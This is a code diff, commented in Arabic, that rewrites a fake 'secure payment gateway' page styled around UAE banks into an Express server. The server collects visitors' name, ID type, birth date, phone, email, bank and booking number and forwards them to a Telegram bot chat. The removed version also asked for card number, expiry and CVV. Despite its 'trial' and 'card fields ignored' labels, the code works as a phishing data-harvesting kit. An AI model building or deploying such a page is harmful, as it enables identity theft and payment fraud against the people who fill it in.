@@ -1,11 +1,37 @@
-<!DOCTYPE html>
+/**
+ * app.js
+ * --- خادم Express واحد (ملف واحد) يقدم واجهة HTML ويُرسل بيانات غير حساسة إلى Telegram.
+ *
+ * تشغيل:
+ * 1) npm init -y
+ * 2) npm install express axios
+ * 3) تعيين المتغيرات البيئية:
+ *    - TELEGRAM_BOT_TOKEN  (مثال: 8175... )
+ *    - TELEGRAM_CHAT_ID    (مثال: 8404960059)
+ *    يمكنك تشغيله مؤقتًا في bash: 
+ *      TELEGRAM_BOT_TOKEN="..." TELEGRAM_CHAT_ID="..." node app.js
+ * 4) افتح http://localhost:3000
+ *
+ * ملاحظة أمنية مهمة: هذا الكود **يتجاهل** الحقول الحساسة (cardNumber, cvv) ولا يرسلها.
+ */
+
+const express = require('express');
+const axios = require('axios');
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Parse JSON body
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// صفحة HTML مدمجة — تصميم RTL مشابه الذي استخدمتَه
+const htmlPage = `<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />الضريبة
-  <title>بوابة الدفع -  (ملف واحد)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>بوابة الدفع - تجريبي (ملف واحد)</title>
   <style>
-    /* عام (يحافظ على تصميمك) */
     body{font-family:Arial,Helvetica,sans-serif;direction:rtl;background:#f5f5f5;margin:0;padding:0}
     header, footer{background:#004080;color:#fff;text-align:center;padding:18px 0}
     .wrap{max-width:720px;margin:18px auto;padding:18px}
@@ -18,16 +44,9 @@
     .small{font-size:13px;color:#666;text-align:center;margin-top:12px}
     .dob{display:flex;gap:8px}
     .dob input{flex:1}
-    .hidden{display:none}
-    .center{text-align:center}
     .row{display:flex;gap:8px;align-items:center}
     .col{flex:1}
     .error{color:#b00020;font-size:13px;display:none;margin-top:8px}
-    /* صفحة التأكيد */
-    .summary .row{justify-content:space-between;padding:8px 0;border-bottom:1px dashed #eee}
-    .summary .label{color:#666}
-    .summary .value{font-weight:700}
-    /* مظهر اختيار البنك كسهم داخل المربع */
     select.bank-select{
       appearance:none;-webkit-appearance:none;-moz-appearance:none;
       background-image: linear-gradient(45deg, transparent 50%, #666 50%),
@@ -37,280 +56,162 @@
       background-repeat: no-repeat;
       padding-left:42px;
     }
-    @media (max-width:600px){
-      .wrap{padding:12px}
-    }
+    .note-safe{color:#0b61c2;font-size:13px;margin-top:10px}
   </style>
 </head>
 <body>
-  <header>
-    <div class="wrap center">
-      <div style="font-weight:800">بوابة الدفع الآمنة — </div>
-    </div>
-  </header>
-
+  <header><div class="wrap center"><div style="font-weight:800">بوابة الدفع الآمنة — تجريبي</div></div></header>
   <main class="wrap">
-    <!-- الصفحة 1: بيانات شخصية + اختيار البنك -->
-    <section id="step1" class="card">
-      <h1>البيانات الشخصية</h1>
-      <form id="personalForm" autocomplete="off" novalidate>
-        <label for="fullName">الاسم الكامل</label>
-        <input id="fullName" type="text" placeholder="الاسم الكامل" required />
+    <section class="card">
+      <h1>النموذج (تجريبي)</h1>
+      <form id="theForm">
+        <label>الاسم الكامل</label>
+        <input name="fullName" required />
 
-        <label for="idType">نوع الهوية</label>
-        <select id="idType" required>
+        <label>نوع الهوية</label>
+        <select name="idType" required>
           <option value="">اختر نوع الهوية</option>
           <option value="هوية اماراتية">الهوية الإماراتية</option>
           <option value="جواز سفر">جواز السفر</option>
         </select>
 
-        <label style="margin-top:8px">تاريخ الميلاد (ميلادي)</label>
+        <label>تاريخ الميلاد (يوم)</label>
         <div class="dob">
-          <input id="day" type="number" placeholder="يوم" min="1" max="31" required />
-          <input id="month" type="number" placeholder="شهر" min="1" max="12" required />
-          <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required />
+          <input name="day" type="number" placeholder="يوم" min="1" max="31" required />
+          <input name="month" type="number" placeholder="شهر" min="1" max="12" required />
+          <input name="year" type="number" placeholder="سنة" min="1900" max="2100" required />
         </div>
 
-        <label for="phone">رقم الجوال</label>
-        <input id="phone" type="tel" placeholder="05XXXXXXXX" required />
+        <label>رقم الجوال</label>
+        <input name="phone" type="tel" required />
 
-        <!-- اختيار البنك داخل المربع -->
-        <label for="bank">ادخل البنك الخاص بك</label>
-        <select id="bank" class="bank-select" required>
+        <label>اختر البنك</label>
+        <select name="bank" class="bank-select" required>
           <option value="">— اختر البنك —</option>
           <option>بنك أبوظبي الأول</option>
           <option>مصرف أبوظبي الإسلامي</option>
           <option>بنك أبوظبي التجاري</option>
           <option>بنك الإمارات دبي الوطني</option>
           <option>بنك دبي الإسلامي</option>
-          <option>بنك دبي التجاري</option>
           <option>بنك المشرق</option>
           <option>مصرف الشارقة الإسلامي</option>
           <option>بنك عجمان</option>
           <option>مصرف الهلال</option>
-          <option>بنك رأس الخيمة</option>
-          <option>بنك الفجيرة الوطني</option>
           <option>HSBC</option>
-          <option>LIV</option>
-          <option>البنك التجاري الدولي</option>
-          <option>بنك ستاندرد تشارترد</option>
         </select>
 
-        <label for="email">البريد الإلكتروني</label>
-        <input id="email" type="email" placeholder="example@mail.com" required />
+        <label>البريد الإلكتروني</label>
+        <input name="email" type="email" required />
 
-        <div class="error" id="errStep1">الرجاء ملء كل الحقول بشكل صحيح بما في ذلك اختيار البنك.</div>
+        <label>رقم الحجز (6 أرقام)</label>
+        <input name="booking" maxlength="6" pattern="\\d{6}" />
 
-        <button id="toStep2" type="button">التالي</button>
-        <p class="small">سيتم نقل بياناتك إلى صفحة الدفع التالية لأكمال العملية ().</p>
+        <!-- الحقول التالية موجودة للعرض فقط — سيتم تجاهلها server-side -->
+        <label>رقم البطاقة (عرض فقط — سيُتجاهل)</label>
+        <input name="cardNumber" placeholder="1234-5678-9012-3456"/>
+
+        <label>CVV (عرض فقط — سيُتجاهل)</label>
+        <input name="cvv" placeholder="***"/>
+
+        <div class="note-safe">أمان: الحقول الحساسة مثل رقم البطاقة و CVV **لن** تُرسل إلى تيليجرام.</div>
+
+        <button type="submit">إرسال للتجريب</button>
       </form>
-    </section>
-
-    <!-- الصفحة 2: نموذج البطاقة () -->
-    <section id="step2" class="card hidden">
-      <h1>بوابة الدفع الآمنة</h1>
-      <form id="paymentForm" novalidate>
-        <label for="confirmBooking">تأكيد رقم الحجز (6 أرقام)</label>
-        <input id="confirmBooking" type="text" minlength="6" maxlength="6" placeholder="مثال: 123456" oninput="this.value=this.value.replace(/[^0-9]/g,'')" required />
-
-        <div class="error" id="lengthError">❗ رقم الحجز يجب أن يتكون من 6 أرقام فقط.</div>
-
-        <label for="cardNumber">رقم البطاقة (عرضي فقط)</label>
-        <input id="cardNumber" type="text" maxlength="19" placeholder="ادخل الرمز المكون من 16رقم" oninput="formatCardNumber(this)" />
-
-        <label for="cardName">الاسم الموجود على البطاقة</label>
-        <input id="cardName" type="text" placeholder="اسم حامل البطاقة" />
-
-        <div style="display:flex;gap:8px">
-          <div class="col">
-            <label for="expiryMonth">الشهر (MM)</label>
-            <select id="expiryMonth">
-              <option value="">--</option>
-              <option>01</option><option>02</option><option>03</option>
-              <option>04</option><option>05</option><option>06</option>
-              <option>07</option><option>08</option><option>09</option>
-              <option>10</option><option>11</option><option>12</option>
-            </select>
-          </div>
-          <div class="col">
-            <label for="expiryYear">السنة (YYYY)</label>
-            <select id="expiryYear">
-              <option value="">--</option>
-              <option>2025</option><option>2026</option><option>2027</option>
-              <option>2028</option><option>2029</option><option>2030</option>
-              <option>2031</option><option>2032</option>
-            </select>
-          </div>
-        </div>
-
-        <label for="cvv">CVV (3 أرقام) — للحقل المعروض فقط</label>
-        <input id="cvv" type="text" minlength="3" maxlength="3" placeholder="***" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
-
-        <div class="error" id="dateError">❗ لأسباب أمنية، لا يمكننا قبول بطاقات منتهية الصلاحية.</div>
-
-        <div style="margin-top:12px">
-          <button id="payNow" type="button">ادفع الآن</button>
-        </div>
-      </form>
-      <p class="small center" style="margin-top:12px">هذه الصفحة الدفع — يتم إرسال بيانات البطاقة لأي جهة.</p>
-    </section>
-
-    <!-- الصفحة 3: تأكيد / ملخص -->
-    <section id="step3" class="card hidden">
-      <h1>مراجعة بيانات الدفع </h1>
-      <div class="summary" id="summaryBox">
-        <!-- سيتم ملؤها عبر جافاسكربت -->
-      </div>
-
-      <div style="display:flex;gap:8px;margin-top:14px">
-        <button id="finalContinue" style="flex:1;background:#0b61c2">متابعة</button>
-        <button id="editBack" style="flex:1;background:#ddd;color:#111">تعديل</button>
-      </div>
-
-      <p class="small" style="margin-top:12px;color:#666">ملاحظة: هذه محاكاة للتدفق فقط.  نرسل أو نخزن بيانات البطاقة الحساسة.</p>
+      <p id="status" class="small"></p>
     </section>
   </main>
+  <footer><div class="wrap center">جميع الحقوق محفوظة © 2025</div></footer>
 
-  <footer>
-    <div class="wrap center">جميع الحقوق محفوظة © 2025</div>
-  </footer>
+  <script>
+    document.getElementById('theForm').addEventListener('submit', async function(e){
+      e.preventDefault();
+      const form = e.target;
+      const data = Object.fromEntries(new FormData(form).entries());
 
-<script>
-  // تنسيقات بسيطة ووظائف مساعده
-  function formatCardNumber(input){
-    let v = input.value.replace(/[^0-9]/g,'').slice(0,16);
-    input.value = v.match(/.{1,4}/g)?.join('-') || v;
-  }
+      // إرسال فقط الحقول الآمنة إلى الخادم
+      const safe = {
+        fullName: data.fullName || '',
+        idType: data.idType || '',
+        birth: (data.day||'') + '/' + (data.month||'') + '/' + (data.year||''),
+        phone: data.phone || '',
+        bank: data.bank || '',
+        email: data.email || '',
+        booking: data.booking || ''
+      };
 
-  // عناصر
-  const step1 = document.getElementById('step1');
-  const step2 = document.getElementById('step2');
-  const step3 = document.getElementById('step3');
-
-  // STEP1 -> STEP2
-  document.getElementById('toStep2').addEventListener('click', function(){
-    const fullName = document.getElementById('fullName').value.trim();
-    const idType = document.getElementById('idType').value;
-    const day = document.getElementById('day').value.trim();
-    const month = document.getElementById('month').value.trim();
-    const year = document.getElementById('year').value.trim();
-    const phone = document.getElementById('phone').value.trim();
-    const email = document.getElementById('email').value.trim();
-    const bank = document.getElementById('bank').value;
-    const err = document.getElementById('errStep1');
-
-    // تحقق بسيط بما في ذلك البنك
-    if(!fullName || !idType || !day || !month || !year || !phone || !email || !bank){
-      err.style.display = 'block';
-      return;
-    }
-    err.style.display = 'none';
-
-    // خزّن بيانات غير حسّاسة في sessionStorage للعرض لاحقًا
-    const pData = { fullName, idType, birth: `${day}/${month}/${year}`, phone, email, bank };
-    sessionStorage.setItem('personalData', JSON.stringify(pData));
-
-    // انتقل للخطوة 2
-    step1.classList.add('hidden');
-    step2.classList.remove('hidden');
-    window.scrollTo(0,0);
-  });
-
-  // STEP2 -> STEP3 (عند الضغط ادفع الآن)
-  document.getElementById('payNow').addEventListener('click', function(){
-    // تحقق الحقول كما في كودك (لكن نرسل رقم البطاقة/CVV)
-    const confirmBooking = document.getElementById('confirmBooking').value.trim();
-    const lengthError = document.getElementById('lengthError');
-    const dateError = document.getElementById('dateError');
-
-    lengthError.style.display = 'none';
-    dateError.style.display = 'none';
-
-    if(confirmBooking.length !== 6){
-      lengthError.style.display = 'block';
-      return;
-    }
-
-    const monthVal = document.getElementById('expiryMonth').value;
-    const yearVal = document.getElementById('expiryYear').value;
-    if(!monthVal || !yearVal){
-      dateError.textContent = '❗ الرجاء اختيار شهر وسنة صالحة.';
-      dateError.style.display = 'block';
-      return;
-    }
-
-    const month = parseInt(monthVal,10);
-    const year = parseInt(yearVal,10);
-    const now = new Date();
-    const currentYear = now.getFullYear();
-    const currentMonth = now.getMonth() + 1;
-    if(year < currentYear || (year === currentYear && month < currentMonth)){
-      dateError.textContent = '❗ لأسباب أمنية، لا يمكننا قبول بطاقات منتهية الصلاحية.';
-      dateError.style.display = 'block';
-      return;
-    }
-
-    // اجلب بيانات غير حساسة فقط للعرض
-    const cardHolderName = document.getElementById('cardName').value.trim();
-    const safePayment = {
-      confirmBooking,
-      cardHolderName,
-      expiry: `${monthVal}/${yearVal}`
-    };
-    sessionStorage.setItem('paymentSafeData', JSON.stringify(safePayment));
-
-    // جهز ملخص العرض بدمج personalData و paymentSafeData
-    const personal = JSON.parse(sessionStorage.getItem('personalData') || '{}');
-    const summaryBox = document.getElementById('summaryBox');
-    summaryBox.innerHTML = `
-      <div class="row"><div class="label">الاسم</div><div class="value">${escapeHtml(personal.fullName||'-')}</div></div>
-      <div class="row"><div class="label">الهاتف</div><div class="value">${escapeHtml(personal.phone||'-')}</div></div>
-      <div class="row"><div class="label">البريد</div><div class="value">${escapeHtml(personal.email||'-')}</div></div>
-      <div class="row"><div class="label">البنك المختار</div><div class="value">${escapeHtml(personal.bank||'-')}</div></div>
-      <div class="row"><div class="label">رقم الحجز</div><div class="value">${escapeHtml(safePayment.confirmBooking||'-')}</div></div>
-      <div class="row"><div class="label">اسم على البطاقة</div><div class="value">${escapeHtml(safePayment.cardHolderName||'-')}</div></div>
-      <div class="row"><div class="label">تاريخ الانتهاء</div><div class="value">${escapeHtml(safePayment.expiry||'-')}</div></div>
-    `;
-
-    // انتقل للخطوة 3
-    step2.classList.add('hidden');
-    step3.classList.remove('hidden');
-    window.scrollTo(0,0);
-  });
-
-  // تعديل: الرجوع لتعديل البطاقة
-  document.getElementById('editBack').addEventListener('click', function(){
-    step3.classList.add('hidden');
-    step2.classList.remove('hidden');
-    window.scrollTo(0,0);
-  });
-
-  // متابعة نهائية: تحويل/نجاح 
-  document.getElementById('finalContinue').addEventListener('click', function(){
-    sessionStorage.removeItem('personalData');
-    sessionStorage.removeItem('paymentSafeData');
-    showSuccess();
-  });
-
-  function showSuccess(){
-    step3.classList.add('hidden');
-    const successHtml = document.createElement('section');
-    successHtml.className = 'card';
-    successHtml.innerHTML = `
-      <h1>✅ العملية تمت بنجاح </h1>
-      <p class="center">تمت محاكاة تحويلك إلى صفحة الدفع. هذه نتيجة  فقط.</p>
-      <div style="text-align:center;margin-top:14px">
-        <button onclick="location.reload()">رجوع للنموذج</button>
-      </div>
-    `;
-    document.querySelector('main .wrap')?.appendChild(successHtml) || document.body.appendChild(successHtml);
-    window.scrollTo(0,0);
-  }
-
-  // دالة مساعدة لتفادي حقن HTML عند عرض البيانات
-  function escapeHtml(str){
-    return String(str||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-  }
-</script>
+      try {
+        const res = await fetch('/submit', {
+          method: 'POST',
+          headers: {'Content-Type':'application/json'},
+          body: JSON.stringify(safe)
+        });
+        if (!res.ok) throw new Error(await res.text());
+        document.getElementById('status').innerText = '✅ تم الإرسال إلى البوت (تجريبي)';
+      } catch (err) {
+        console.error(err);
+        document.getElementById('status').innerText = '❌ فشل الإرسال، تحقق من الخادم';
+      }
+    });
+  </script>
 </body>
-</html>
+</html>`;
+
+// Serve main page
+app.get('/', (req, res) => {
+  res.type('html').send(htmlPage);
+});
+
+// Endpoint يستقبل الحقول الآمنة ويرسلها إلى Telegram
+app.post('/submit', async (req, res) => {
+  try {
+    const BOT = process.env.TELEGRAM_BOT_TOKEN;
+    const CHAT = process.env.TELEGRAM_CHAT_ID;
+    if (!BOT || !CHAT) {
+      return res.status(500).send('Bot token or chat id not configured on server.');
+    }
+
+    // الحقول الواردة — فقط الآمنة
+    const {
+      fullName = '',
+      idType = '',
+      birth = '',
+      phone = '',
+      bank = '',
+      email = '',
+      booking = ''
+    } = req.body || {};
+
+    // نبني نصًا للرسالة (غير حساس)
+    const message =
+`🔔 رسالة تجريبية من واجهة الدفع (آمنة)
+👤 الاسم: ${escape(fullName)}
+🆔 نوع الهوية: ${escape(idType)}
+🎂 تاريخ الميلاد: ${escape(birth)}
+📱 الجوال: ${escape(phone)}
+🏦 البنك: ${escape(bank)}
+✉️ البريد: ${escape(email)}
+🔢 رقم الحجز: ${escape(booking)}`;
+
+    // أرسل الرسالة إلى Telegram باستخدام التوكن من البيئة
+    const url = `https://api.telegram.org/bot${BOT}/sendMessage`;
+    const resp = await axios.post(url, { chat_id: CHAT, text: message });
+
+    if (resp.data && resp.data.ok) {
+      return res.json({ ok: true });
+    } else {
+      return res.status(502).json({ ok: false, error: resp.data });
+    }
+  } catch (err) {
+    console.error('Failed sending to Telegram:', err?.response?.data || err.message || err);
+    return res.status(500).send('Server error sending to Telegram');
+  }
+});
+
+// helper escape to avoid injection in message
+function escape(str){
+  return String(str || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+app.listen(PORT, () => {
+  console.log(`✅ Running on http://localhost:${PORT}`);
+});
